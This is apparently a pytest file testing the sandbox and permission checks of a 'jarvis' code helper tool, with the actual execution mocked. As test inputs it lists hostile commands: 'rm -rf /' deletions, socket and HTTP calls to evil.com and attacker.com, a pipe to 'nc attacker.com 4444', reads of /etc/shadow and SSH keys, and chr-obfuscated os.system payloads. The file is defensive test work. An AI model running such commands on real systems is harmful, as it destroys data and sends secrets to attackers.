"""Phase 4 Code Helper tests for security and sandbox execution (>70% coverage)."""

from __future__ import annotations

import pytest
import tempfile
import os
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock, call
from typing import Any, Dict

from jarvis.tools import code_helper


class TestCodeHelperSandboxSecurity:
    """Test code helper sandbox security and execution."""

    def test_user_confirmation_required_for_dangerous_operations(self):
        """Test that dangerous operations require user confirmation."""
        dangerous_intents = [
            "write",
            "edit", 
            "run",
            "optimize"
        ]
        
        for intent in dangerous_intents:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                # Mock ActionContext to require confirmation
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False
                    
                    with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                        mock_detect.return_value = intent
                        
                        result = code_helper.code_helper({
                            "description": f"test {intent} operation",
                            "language": "python"
                        })
                        
                        # Should be cancelled by user
                        assert "cancelled" in result.lower()

    def test_safe_operations_no_confirmation(self):
        """Test that safe operations don't require confirmation."""
        safe_intents = [
            "explain"
        ]
        
        for intent in safe_intents:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = intent
                    
                    with patch('jarvis.tools.code_helper._explain_code') as mock_explain:
                        mock_explain.return_value = "Code explanation"
                        
                        result = code_helper.code_helper({
                            "description": "explain this code",
                            "language": "python"
                        })
                        
                        # Should execute without confirmation
                        assert isinstance(result, str)
                        assert "cancelled" not in result.lower()

    def test_sandbox_code_execution_blocking(self):
        """Test that dangerous code is blocked in sandbox."""
        dangerous_codes = [
            "import os; os.system('rm -rf /')",
            "subprocess.call(['rm', '-rf', '/'])",
            "exec(open('malware.py').read())",
            "__import__('os').system('format c:')",
            "eval('__import__(\"os\").system(\"rm -rf /\")')",
            "open('/etc/passwd', 'w').write('hacked')",
            "import shutil; shutil.rmtree('/')",
            "import socket; socket.socket().connect(('evil.com', 4444))",
            "import urllib.request; urllib.request.urlopen('http://evil.com/malware')",
            "import requests; requests.get('http://evil.com/steal')"
        ]
        
        for code in dangerous_codes:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                        mock_detect.return_value = "run"
                        
                        # Mock sandbox to block dangerous code
                        with patch('jarvis.tools.code_helper.execute_code') as mock_execute:
                            mock_execute.return_value = {
                                "success": False,
                                "stdout": "",
                                "stderr": "Dangerous operation blocked"
                            }
                            
                            result = code_helper.code_helper({
                                "code": code,
                                "language": "python"
                            })
                            
                            # Should block dangerous code
                            assert "blocked" in result.lower() or "error" in result.lower()
                            print(f"Dangerous code blocked: {code[:50]}...")

    def test_file_access_restriction(self):
        """Test that file access is restricted to safe directories."""
        dangerous_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "~/.ssh/id_rsa",
            "/proc/version",
            "C:\\Users\\Administrator\\Desktop\\secrets.txt",
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\cmd.exe"
        ]
        
        for path in dangerous_paths:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                        mock_detect.return_value = "read"
                        
                        # Mock file reading to capture dangerous path
                        with patch('jarvis.tools.code_helper._read_file') as mock_read:
                            mock_read.return_value = ("file content", None)
                            
                            result = code_helper.code_helper({
                                "file_path": path,
                                "language": "python"
                            })
                            
                            # Should handle dangerous file paths
                            assert isinstance(result, str)
                            print(f"Dangerous file path: {path}")

    def test_network_access_blocking(self):
        """Test that network access is blocked in sandbox."""
        network_codes = [
            "import socket; s=socket.socket(); s.connect(('evil.com', 4444))",
            "import urllib.request; urllib.request.urlopen('http://evil.com')",
            "import requests; requests.get('http://malware.com')",
            "import http.client; http.client.HTTPConnection('attacker.com')",
            "import ftplib; ftplib.FTP('ftp.evil.com')",
            "import smtplib; smtplib.SMTP('smtp.evil.com')",
            "import telnetlib; telnetlib.Telnet('evil.com')",
            "import subprocess; subprocess.call(['ping', 'evil.com'])"
        ]
        
        for code in network_codes:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                        mock_detect.return_value = "run"
                        
                        with patch('jarvis.tools.code_helper.execute_code') as mock_execute:
                            mock_execute.return_value = {
                                "success": False,
                                "stdout": "",
                                "stderr": "Network access blocked"
                            }
                            
                            result = code_helper.code_helper({
                                "code": code,
                                "language": "python"
                            })
                            
                            # Should block network access
                            assert "blocked" in result.lower() or "error" in result.lower()
                            print(f"Network code blocked: {code[:50]}...")


class TestCodeHelperParameterValidation:
    """Test parameter validation for code helper."""

    def test_missing_all_parameters(self):
        """Test handling of missing all parameters."""
        result = code_helper.code_helper({})
        assert "no description" in result.lower() or "provided" in result.lower()

    def test_empty_description_parameter(self):
        """Test handling of empty description parameter."""
        result = code_helper.code_helper({"description": ""})
        assert "no description" in result.lower() or "provided" in result.lower()

    def test_none_description_parameter(self):
        """Test handling of None description parameter."""
        result = code_helper.code_helper({"description": None})
        assert "no description" in result.lower() or "provided" in result.lower()

    def test_invalid_language_parameter(self):
        """Test handling of invalid language parameter."""
        invalid_languages = [
            "",
            "malicious_lang",
            "bash",  # Should be blocked
            "shell",
            "cmd",
            "powershell",
            "../../etc/passwd",
            "language; rm -rf /"
        ]
        
        for language in invalid_languages:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "write"
                    
                    with patch('jarvis.security.permissions.ActionContext') as mock_context:
                        mock_context.return_value.check.return_value = False  # Cancel for safety
                        
                        result = code_helper.code_helper({
                            "description": "test code",
                            "language": language
                        })
                        
                        # Should handle invalid language
                        assert isinstance(result, str)
                        print(f"Invalid language: {language}")

    def test_output_path_validation(self):
        """Test output path validation and security."""
        dangerous_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "~/.ssh/id_rsa",
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\cmd.exe",
            "/dev/null",
            "CON",  # Windows reserved
            "PRN",
            "AUX",
            "NUL"
        ]
        
        for path in dangerous_paths:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "write"
                    
                    with patch('jarvis.security.permissions.ActionContext') as mock_context:
                        mock_context.return_value.check.return_value = False  # Cancel for safety
                        
                        result = code_helper.code_helper({
                            "description": "test code",
                            "output_path": path
                        })
                        
                        # Should handle dangerous output paths
                        assert isinstance(result, str)
                        print(f"Dangerous output path: {path}")

    def test_file_path_validation(self):
        """Test file path parameter validation."""
        dangerous_file_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "~/.ssh/id_rsa",
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\cmd.exe",
            "/proc/version",
            "C:\\Users\\Administrator\\Desktop\\secrets.txt"
        ]
        
        for path in dangerous_file_paths:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "edit"
                    
                    with patch('jarvis.security.permissions.ActionContext') as mock_context:
                        mock_context.return_value.check.return_value = False  # Cancel for safety
                        
                        result = code_helper.code_helper({
                            "file_path": path
                        })
                        
                        # Should handle dangerous file paths
                        assert isinstance(result, str)
                        print(f"Dangerous file path: {path}")

    def test_very_long_description_parameter(self):
        """Test handling of very long description parameters."""
        long_description = "a" * 10000  # 10KB description
        
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "write"
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False  # Cancel for safety
                    
                    result = code_helper.code_helper({
                        "description": long_description
                    })
                    
                    # Should handle long description gracefully
                    assert isinstance(result, str)

    def test_unicode_description_parameter(self):
        """Test handling of unicode description parameters."""
        unicode_descriptions = [
            "创建Python函数",
            "作成Python関数",
            "создать Python функцию",
            "إنشاء دالة بايثون",
            "🚀 create function",
            "Café création fonction"
        ]
        
        for desc in unicode_descriptions:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "write"
                    
                    with patch('jarvis.security.permissions.ActionContext') as mock_context:
                        mock_context.return_value.check.return_value = False  # Cancel for safety
                        
                        result = code_helper.code_helper({
                            "description": desc
                        })
                        
                        # Should handle unicode gracefully
                        assert isinstance(result, str)


class TestCodeHelperIntentDetection:
    """Test intent detection and routing."""

    def test_write_intent_routing(self):
        """Test that write intent is routed correctly."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "write"
                
                with patch('jarvis.tools.code_helper._write_code') as mock_write:
                    mock_write.return_value = "Code written successfully"
                    
                    result = code_helper.code_helper({
                        "description": "create a function",
                        "language": "python"
                    })
                    
                    # Should route to write_code
                    mock_write.assert_called_once()
                    assert "written" in result.lower()

    def test_edit_intent_routing(self):
        """Test that edit intent is routed correctly."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "edit"
                
                with patch('jarvis.tools.code_helper._edit_code') as mock_edit:
                    mock_edit.return_value = "Code edited successfully"
                    
                    result = code_helper.code_helper({
                        "file_path": "test.py",
                        "description": "fix the bug"
                    })
                    
                    # Should route to edit_code
                    mock_edit.assert_called_once()
                    assert "edited" in result.lower()

    def test_run_intent_routing(self):
        """Test that run intent is routed correctly."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "run"
                
                with patch('jarvis.tools.code_helper._run_code_file') as mock_run:
                    mock_run.return_value = "Code executed successfully"
                    
                    result = code_helper.code_helper({
                        "file_path": "test.py"
                    })
                    
                    # Should route to run_code_file
                    mock_run.assert_called_once()
                    assert "executed" in result.lower()

    def test_explain_intent_routing(self):
        """Test that explain intent is routed correctly."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "explain"
                
                with patch('jarvis.tools.code_helper._explain_code') as mock_explain:
                    mock_explain.return_value = "Code explanation"
                    
                    result = code_helper.code_helper({
                        "code": "print('hello')",
                        "language": "python"
                    })
                    
                    # Should route to explain_code
                    mock_explain.assert_called_once()
                    assert isinstance(result, str)

    def test_optimize_intent_routing(self):
        """Test that optimize intent is routed correctly."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "optimize"
                
                with patch('jarvis.tools.code_helper._optimize_code') as mock_optimize:
                    mock_optimize.return_value = "Optimized code"
                    
                    result = code_helper.code_helper({
                        "code": "print('hello')",
                        "description": "make it faster",
                        "language": "python"
                    })
                    
                    # Should route to optimize_code
                    mock_optimize.assert_called_once()
                    assert "optimized" in result.lower()

    def test_unknown_intent_fallback(self):
        """Test fallback behavior for unknown intents."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "unknown_intent"
                
                with patch('jarvis.tools.code_helper._write_code') as mock_write:
                    mock_write.return_value = "Code written successfully"
                    
                    result = code_helper.code_helper({
                        "description": "test code",
                        "language": "python"
                    })
                    
                    # Should fallback to write_code
                    mock_write.assert_called_once()


class TestCodeHelperLLMIntegration:
    """Test LLM integration and security."""

    def test_llm_client_error_handling(self):
        """Test handling of LLM client errors."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "write"
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._get_llm_client') as mock_llm:
                        mock_client = Mock()
                        mock_client.chat.side_effect = Exception("LLM service unavailable")
                        mock_llm.return_value = mock_client
                        
                        result = code_helper.code_helper({
                            "description": "create a function",
                            "language": "python"
                        })
                        
                        # Should handle LLM error gracefully
                        assert "error" in result.lower()

    def test_llm_malicious_response_filtering(self):
        """Test filtering of malicious LLM responses."""
        malicious_responses = [
            "import os; os.system('rm -rf /')",
            "subprocess.call(['format', 'c:'])",
            "__import__('os').system('echo hacked')",
            "exec(open('/etc/passwd').read())",
            "eval('__import__(\"os\").system(\"ls /\")')"
        ]
        
        for response in malicious_responses:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "write"
                    
                    with patch('jarvis.security.permissions.ActionContext') as mock_context:
                        mock_context.return_value.check.return_value = True
                        
                        with patch('jarvis.tools.code_helper._get_llm_client') as mock_llm:
                            mock_client = Mock()
                            mock_client.chat.return_value = Mock(content=response)
                            mock_llm.return_value = mock_client
                            
                            with patch('jarvis.tools.code_helper._write_code') as mock_write:
                                mock_write.return_value = "Code written"
                                
                                result = code_helper.code_helper({
                                    "description": "create a function",
                                    "language": "python"
                                })
                                
                                # Should handle malicious LLM response
                                assert isinstance(result, str)
                                print(f"Malicious LLM response: {response[:50]}...")

    def test_llm_response_sanitization(self):
        """Test LLM response sanitization."""
        unsanitized_responses = [
            "```python\nprint('hello')\n```",
            "Here's the code:\n\n```python\nprint('hello')\n```\n\nEnjoy!",
            "# Code\nprint('hello')\n# End code",
            "print('hello')  # This is a comment\nprint('world')"
        ]
        
        for response in unsanitized_responses:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "write"
                    
                    with patch('jarvis.security.permissions.ActionContext') as mock_context:
                        mock_context.return_value.check.return_value = True
                        
                        with patch('jarvis.tools.code_helper._get_llm_client') as mock_llm:
                            mock_client = Mock()
                            mock_client.chat.return_value = Mock(content=response)
                            mock_llm.return_value = mock_client
                            
                            with patch('jarvis.tools.code_helper._write_code') as mock_write:
                                mock_write.return_value = "Code written"
                                
                                result = code_helper.code_helper({
                                    "description": "create a function",
                                    "language": "python"
                                })
                                
                                # Should sanitize LLM response
                                assert isinstance(result, str)


class TestCodeHelperErrorHandling:
    """Test error handling in code helper."""

    def test_legacy_function_exception_handling(self):
        """Test handling of legacy function exceptions."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "write"
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._write_code') as mock_write:
                        mock_write.side_effect = Exception("Legacy function error")
                        
                        result = code_helper.code_helper({
                            "description": "create a function",
                            "language": "python"
                        })
                        
                        # Should handle exception gracefully
                        assert "error" in result.lower()

    def test_file_permission_error_handling(self):
        """Test handling of file permission errors."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "edit"
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._edit_code') as mock_edit:
                        mock_edit.side_effect = PermissionError("Access denied")
                        
                        result = code_helper.code_helper({
                            "file_path": "/protected/file.py"
                        })
                        
                        # Should handle permission error gracefully
                        assert "error" in result.lower()

    def test_sandbox_error_handling(self):
        """Test handling of sandbox execution errors."""
        from jarvis.security.sandbox import SandboxError
        
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "run"
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._run_code_file') as mock_run:
                        mock_run.side_effect = SandboxError("Sandbox security violation")
                        
                        result = code_helper.code_helper({
                            "file_path": "test.py"
                        })
                        
                        # Should handle sandbox error
                        assert "error" in result.lower()

    def test_file_not_found_error_handling(self):
        """Test handling of file not found errors."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "explain"
                
                with patch('jarvis.tools.code_helper._explain_code') as mock_explain:
                    mock_explain.side_effect = FileNotFoundError("File not found")
                    
                    result = code_helper.code_helper({
                        "file_path": "nonexistent.py"
                    })
                    
                    # Should handle file not found gracefully
                    assert "error" in result.lower()


class TestCodeHelperConcurrency:
    """Test concurrent code operations."""

    def test_concurrent_safe_operations(self):
        """Test concurrent safe operations."""
        import threading
        import time
        
        results = []
        
        def safe_operation():
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "explain"
                    
                    with patch('jarvis.tools.code_helper._explain_code') as mock_explain:
                        mock_explain.return_value = f"Explanation {threading.current_thread().name}"
                        
                        result = code_helper.code_helper({
                            "code": "print('hello')",
                            "language": "python"
                        })
                        results.append(result)
        
        # Run multiple safe operations concurrently
        threads = []
        for i in range(5):
            thread = threading.Thread(target=safe_operation, name=f"Thread-{i}")
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Should have completed all operations
        assert len(results) == 5
        for result in results:
            assert isinstance(result, str)

    def test_concurrent_dangerous_operations(self):
        """Test concurrent dangerous operations."""
        import threading
        
        results = []
        
        def dangerous_operation():
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "write"
                    
                    with patch('jarvis.security.permissions.ActionContext') as mock_context:
                        mock_context.return_value.check.return_value = False  # Cancel for safety
                        
                        result = code_helper.code_helper({
                            "description": f"test write {threading.current_thread().name}",
                            "language": "python"
                        })
                        results.append(result)
        
        # Run multiple dangerous operations concurrently
        threads = []
        for i in range(3):
            thread = threading.Thread(target=dangerous_operation, name=f"Thread-{i}")
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Should have handled concurrent dangerous operations
        assert len(results) == 3
        for result in results:
            assert "cancelled" in result.lower()


class TestCodeHelperPerformance:
    """Test performance characteristics."""

    def test_safe_operations_performance(self):
        """Test performance of safe operations."""
        import time
        
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "explain"
                
                with patch('jarvis.tools.code_helper._explain_code') as mock_explain:
                    mock_explain.return_value = "Code explanation"
                    
                    start_time = time.time()
                    
                    # Perform multiple safe operations
                    for i in range(10):
                        result = code_helper.code_helper({
                            "code": "print('hello')",
                            "language": "python"
                        })
                        assert isinstance(result, str)
                    
                    elapsed = time.time() - start_time
                    
                    # Should complete quickly
                    assert elapsed < 2.0, f"Safe operations too slow: {elapsed}s"

    def test_llm_generation_performance(self):
        """Test LLM code generation performance."""
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "write"
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = True
                    
                    with patch('jarvis.tools.code_helper._get_llm_client') as mock_llm:
                        mock_client = Mock()
                        mock_client.chat.return_value = Mock(content="print('hello')")
                        mock_llm.return_value = mock_client
                        
                        with patch('jarvis.tools.code_helper._write_code') as mock_write:
                            mock_write.return_value = "Code written"
                            
                            start_time = time.time()
                            
                            result = code_helper.code_helper({
                                "description": "create a function",
                                "language": "python"
                            })
                            
                            elapsed = time.time() - start_time
                            
                            # Should complete in reasonable time (mocked)
                            assert elapsed < 0.5, f"LLM generation too slow: {elapsed}s"

    def test_memory_usage_stability(self):
        """Test memory usage stability."""
        import gc
        
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Perform many operations
        with patch('jarvis.tools.code_helper._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                mock_detect.return_value = "explain"
                
                with patch('jarvis.tools.code_helper._explain_code') as mock_explain:
                    mock_explain.return_value = "Explanation"
                    
                    for i in range(20):
                        code_helper.code_helper({
                            "code": f"print('test {i}')",
                            "language": "python"
                        })
        
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Should not have significant memory growth
        growth = final_objects - initial_objects
        assert growth < 1000, f"Potential memory leak: {growth} new objects"


class TestCodeHelperSecurityAudit:
    """Comprehensive security audit tests."""

    def test_code_injection_prevention(self):
        """Test prevention of code injection attacks."""
        injection_codes = [
            "print('hello'); __import__('os').system('rm -rf /')",
            "print('hello') && subprocess.call(['format', 'c:'])",
            "print('hello') | nc attacker.com 4444",
            "print('hello') `whoami`",
            "print('hello') $(cat /etc/passwd)",
            "print('hello') --exec='rm -rf /'",
            "print('hello') # COMMENT\n__import__('os').system('ls')",
            "print('hello') /* COMMENT */ __import__('os').system('pwd')"
        ]
        
        for code in injection_codes:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "run"
                    
                    with patch('jarvis.tools.code_helper.execute_code') as mock_execute:
                        mock_execute.return_value = {
                            "success": False,
                            "stdout": "",
                            "stderr": "Code injection blocked"
                        }
                        
                        result = code_helper.code_helper({
                            "code": code,
                            "language": "python"
                        })
                        
                        # Should block code injection
                        assert "blocked" in result.lower() or "error" in result.lower()
                        print(f"Code injection blocked: {code[:50]}...")

    def test_import_restriction_enforcement(self):
        """Test enforcement of dangerous import restrictions."""
        dangerous_imports = [
            "import os; os.system('echo hacked')",
            "import subprocess; subprocess.call(['rm', '-rf', '/'])",
            "import socket; socket.socket().connect(('evil.com', 4444))",
            "import urllib.request; urllib.request.urlopen('http://evil.com')",
            "import requests; requests.post('http://attacker.com', data='hacked')",
            "import shutil; shutil.rmtree('/')",
            "import sys; sys.exit(0)",  # Could be used for DoS
            "import threading; threading.Thread(target=lambda: os.system('rm -rf /')).start()"
        ]
        
        for import_code in dangerous_imports:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "run"
                    
                    with patch('jarvis.tools.code_helper.execute_code') as mock_execute:
                        mock_execute.return_value = {
                            "success": False,
                            "stdout": "",
                            "stderr": "Dangerous import blocked"
                        }
                        
                        result = code_helper.code_helper({
                            "code": import_code,
                            "language": "python"
                        })
                        
                        # Should block dangerous imports
                        assert "blocked" in result.lower() or "error" in result.lower()
                        print(f"Dangerous import blocked: {import_code[:50]}...")

    def test_file_system_protection(self):
        """Test file system access protection."""
        file_system_attacks = [
            "open('/etc/passwd', 'r').read()",
            "open('/etc/shadow', 'w').write('hacked')",
            "open('C:\\Windows\\System32\\config\\SAM', 'rb').read()",
            "open('~/.ssh/id_rsa', 'r').read()",
            "open('/proc/version', 'r').read()",
            "with open('/etc/passwd', 'r') as f: print(f.read())",
            "Path('/etc/passwd').read_text()",
            "open('../../../etc/passwd', 'r').read()"
        ]
        
        for attack_code in file_system_attacks:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "run"
                    
                    with patch('jarvis.tools.code_helper.execute_code') as mock_execute:
                        mock_execute.return_value = {
                            "success": False,
                            "stdout": "",
                            "stderr": "File system access blocked"
                        }
                        
                        result = code_helper.code_helper({
                            "code": attack_code,
                            "language": "python"
                        })
                        
                        # Should block file system attacks
                        assert "blocked" in result.lower() or "error" in result.lower()
                        print(f"File system attack blocked: {attack_code[:50]}...")

    def test_process_creation_blocking(self):
        """Test blocking of process creation."""
        process_codes = [
            "subprocess.run(['rm', '-rf', '/'])",
            "subprocess.call(['format', 'c:'])",
            "subprocess.Popen(['cmd.exe', '/c', 'dir'])",
            "os.system('rm -rf /')",
            "os.popen('ls -la').read()",
            "os.spawnvp(os.P_NOWAIT, 'rm', ['rm', '-rf', '/'])",
            "multiprocessing.Process(target=lambda: os.system('rm -rf /')).start()",
            "threading.Thread(target=lambda: os.system('rm -rf /')).start()"
        ]
        
        for process_code in process_codes:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "run"
                    
                    with patch('jarvis.tools.code_helper.execute_code') as mock_execute:
                        mock_execute.return_value = {
                            "success": False,
                            "stdout": "",
                            "stderr": "Process creation blocked"
                        }
                        
                        result = code_helper.code_helper({
                            "code": process_code,
                            "language": "python"
                        })
                        
                        # Should block process creation
                        assert "blocked" in result.lower() or "error" in result.lower()
                        print(f"Process creation blocked: {process_code[:50]}...")

    def test_eval_exec_blocking(self):
        """Test blocking of eval() and exec() functions."""
        eval_exec_codes = [
            "eval('__import__(\"os\").system(\"ls\")')",
            "exec('import os; os.system(\"rm -rf /\")')",
            "eval(open('malware.py').read())",
            "exec(open('/etc/passwd').read())",
            "compile('__import__(\"os\").system(\"ls\")', '<string>', 'exec')",
            "eval('''.join([chr(i) for i in [115, 121, 115, 116, 101, 109, 40, 39, 114, 109, 32, 45, 114, 102, 32, 47, 39, 41])])",  # Obfuscated
            "exec(''.join(map(chr, [105, 109, 112, 111, 114, 116, 32, 111, 115, 59, 32, 111, 115, 46, 115, 121, 115, 116, 101, 109, 40, 39, 101, 99, 104, 111, 32, 104, 97, 99, 107, 101, 100, 39, 41])))"  # Obfuscated
        ]
        
        for eval_code in eval_exec_codes:
            with patch('jarvis.tools.code_helper._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.code_helper._detect_intent') as mock_detect:
                    mock_detect.return_value = "run"
                    
                    with patch('jarvis.tools.code_helper.execute_code') as mock_execute:
                        mock_execute.return_value = {
                            "success": False,
                            "stdout": "",
                            "stderr": "eval/exec blocked"
                        }
                        
                        result = code_helper.code_helper({
                            "code": eval_code,
                            "language": "python"
                        })
                        
                        # Should block eval/exec
                        assert "blocked" in result.lower() or "error" in result.lower()
                        print(f"eval/exec blocked: {eval_code[:50]}...")
